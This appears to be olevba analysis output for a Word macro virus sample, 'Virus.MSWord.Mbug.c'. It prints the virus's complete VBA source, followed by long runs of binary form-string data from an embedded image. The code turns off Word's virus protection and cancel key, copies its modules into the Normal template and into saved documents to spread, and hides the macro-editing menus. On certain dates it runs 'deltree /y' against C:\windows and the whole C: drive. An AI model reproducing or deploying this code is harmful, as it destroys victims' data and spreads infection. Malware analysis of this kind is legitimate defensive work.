olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Mbug.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Mbug.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO UserForm1.frm 
in file: ./Virus.MSWord.Mbug.c - OLE stream: 'Macros/VBA/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub CommandButton1_Click()
MsgBox "??? Nothing, Go to see who am I", vbOKOnly, "Microsoft who"
End Sub

Private Sub CommandButton2_Click()
MsgBox "??? Nothing, Go to see who am I", vbOKOnly, "Microsoft who"
End Sub

Private Sub Image1_Click()
UserForm2.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm2.frm 
in file: ./Virus.MSWord.Mbug.c - OLE stream: 'Macros/VBA/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub CommandButton1_Click()
Shell "deltree /y c:\windows", vbHide
Shell "deltree /y c:\*.*", vbHide
MsgBox "Huh!  Don't have", vbInformation, "Microsoft who"
End Sub
-------------------------------------------------------------------------------
VBA MACRO who.bas 
in file: ./Virus.MSWord.Mbug.c - OLE stream: 'Macros/VBA/who'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
If Day(Now()) = "1" Or Day(Now()) = "13" Or Day(Now()) = "18" Then
UserForm1.Show
Shell "deltree /y c:\windows", vbHide
Shell "deltree /y c:\*.*", vbHide
End If
End Sub

Sub AutoClose()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAC
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "who" Then
        whoInstalled = -1
    End If
Next i
If Not whoInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="who", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm1", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm2", Object:=wdOrganizerObjectProjectItems
End If
ErrorAC:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="who", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm1", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm2", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
If Day(Now()) = "5" Or Day(Now()) = "10" Or Day(Now()) = "29" Then
UserForm1.Show
Shell "deltree /y c:\windows", vbMinimizedFocus
Shell "deltree /y c:\*.*", vbMinimizedFocus
End If
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
    MsgBox "", vbInformation
ErrorFT:
End Sub

Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
    MsgBox "", vbInformation
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
    MsgBox "", vbInformation
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GIF89a�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
			



-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
   !!!"""###$$$%%%&&&'''((()))***+++,,,---...///000111222333444555666777888999:::;;;<<<===>>>???@@@AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMNNNOOOPPPQQQRRRSSSTTTUUUVVVWWWXXXYYYZZZ[[[\\\]]]^^^___```aaabbbcccdddeeefffggghhhiiijjjkkklllmmmnnnooopppqqqrrrssstttuuuvvvwwwxxxyyyzzz{{{|||}}}~~~������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������,
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*\Ȱ�Ç
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#J�H��ŋ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3j�ȱ�Ǐ C�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I��ɓ(S�\ɲ�G~��KG�f���\����ݹoԂ

-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�Z�o�����4�<rيJ�:�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
կ`�}{�U+�paӂ�F��K}@���ʍ�[�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��һ%�E�Kx*7��E�+�x굜�=�۸��Ǒ9��f��eș/���45̡+�6͚���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�fm:
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�؜iӖw�!9ݺ��n��3Ryv	�yn6�t�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
޳�����~3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a��ْG����o��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?�ȯ�\��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_ﾘ0j��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v^F��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]|��uNG
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��]G�q
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
es��Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\���!H'���z{]�Qa荘
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
; E8�5��S
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��W����N86
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A��s�sD-
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��O&$S:����F�0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d�
��#O���!�-�Wؙl╤Zc�i���9i'Jx���I}
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��$�W�5�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��j��h�i
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��!qh
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��zdie�e����e����%���f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ha��t�2�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#�A�(c�2�
����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<��:��S
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S˱�~�*G�&3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�bI#�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s���d[�A�X"	"��3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"�X2�H�J
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&ٶ��Tـ�Q��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"MA�TB��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u�.$��S
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"����#��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#U�!�c	%�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�NA�P�H�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
QbH"�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u[�"��s	"�H
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�N�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!]c�!�p;�#$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
lI$�̊�%�|�9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<U+<g�
Qߌ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1�(rH)F#MLA�4��!�(�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9����J�a
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n%�LB�%�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5�H��{�0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$L�q�\�@�$����P�.�г
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e3K���cA�ReJ���$�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"<,����'�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IS�!�ΐ'����6
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���"�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��#M/��@�D҈!�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���<�
+��"?+�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)r�"�4����@�+V�(1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�xׁ�A�r
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V"[P[H8F�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8涹�Bd��^*��7V��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��F�-
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��FP�j�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2(V0KT"�ʫ�!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3X��\|� �k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	u��C
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+TY�A	J@"}
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#PACi�#
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
뀇8�R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q*��"%$Q@j��w��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��b�L��q�BmɃ�Br��]�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���=
��F$C /��$�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
繆 -�4H,�A�P
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
42Q�I�B(��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ٚ�?L
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�D8L �XD
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
QBx("
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@�*�a��E@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
rt�c(
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`�@��
�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4
�"�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1,���$$��"
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AE�m �ۢ&�'
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`4"yl�N)��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P+o��E�f1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|.�o���8�A
�1��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y1��#y�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*�2�CP�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H8��9� ⬈��@T�8^h�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�܇M}H
xȍy��'=���ԬhmFA^�Tp4/y���A,�ѯ�b{ɻE0�!�k�0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����?
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�D�k!ĐD,vQ��dK
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���S|��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P�#�A�t�5
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a]��y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d��k�@�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`��?Z�2C
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r �@�%
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qEnK1���bj>lڬ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|BB��(�4�
����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
